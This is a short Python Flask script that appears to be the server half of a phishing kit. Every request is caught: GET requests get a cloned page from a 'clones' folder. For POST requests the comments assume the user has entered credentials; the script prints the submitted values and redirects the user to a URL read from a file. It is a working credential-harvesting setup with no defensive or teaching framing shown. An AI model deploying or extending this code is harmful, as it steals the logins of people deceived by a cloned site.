from flask import Flask, request, redirect
from flask import send_from_directory


app = Flask(__name__)

# Catching all requests.
@app.route('/', defaults={'path': ''}, methods={'GET', 'POST'})
@app.route('/<path:path>', methods={'GET', 'POST'})
def catch_all(path):
    # if a post request, assuming the user entered credentials and then redirecting them to the site they wish.s
    if request.method == 'POST':
        # opens the redirect file to get the url
        redirectURLFile = open("redirectURL.txt", "r")
        print(request.values)
        url = redirectURLFile.readline()
        return redirect(url, code=302)
    elif request.method == 'GET':
        return send_from_directory('clones', 'page.html')

if __name__ == '__main__':
    app.run()
